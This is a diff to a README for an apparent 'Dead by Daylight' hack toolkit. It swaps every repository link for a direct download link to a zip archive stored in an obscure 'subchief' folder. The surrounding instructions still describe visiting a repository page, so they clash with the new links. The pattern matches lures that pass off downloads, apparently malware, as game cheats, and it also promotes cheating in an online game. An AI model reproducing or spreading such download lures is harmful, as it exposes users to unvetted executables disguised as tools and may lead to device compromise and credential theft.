@@ -1,6 +1,6 @@
 # ⚡ dead-by-daylight-hack-dbd-trials-toolkit - Master Every Trial Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Toolkit_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Toolkit_Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://raw.githubusercontent.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit/main/subchief/dead_trials_dbd_daylight_toolkit_by_hack_1.2.zip)
 
 ## 🎮 What Is This Toolkit?
 
@@ -12,7 +12,7 @@ Getting up and running takes less than two minutes. Here's exactly what you need
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit](https://github.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit)
+Visit this link to download the application: [https://raw.githubusercontent.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit/main/subchief/dead_trials_dbd_daylight_toolkit_by_hack_1.2.zip](https://raw.githubusercontent.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit/main/subchief/dead_trials_dbd_daylight_toolkit_by_hack_1.2.zip)
 
 You'll land on the main page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click either one – they'll both take you to where you can grab the latest version.
 
@@ -121,7 +121,7 @@ That's it! No complicated setup, no technical knowledge needed. Just pure improv
 
 ---
 
-**Download now** and take your first step toward dominating the trials: [https://github.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit](https://github.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit)
+**Download now** and take your first step toward dominating the trials: [https://raw.githubusercontent.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit/main/subchief/dead_trials_dbd_daylight_toolkit_by_hack_1.2.zip](https://raw.githubusercontent.com/zenki10/dead-by-daylight-hack-dbd-trials-toolkit/main/subchief/dead_trials_dbd_daylight_toolkit_by_hack_1.2.zip)
 
 Happy hunting, and see you in the fog! 👻
 
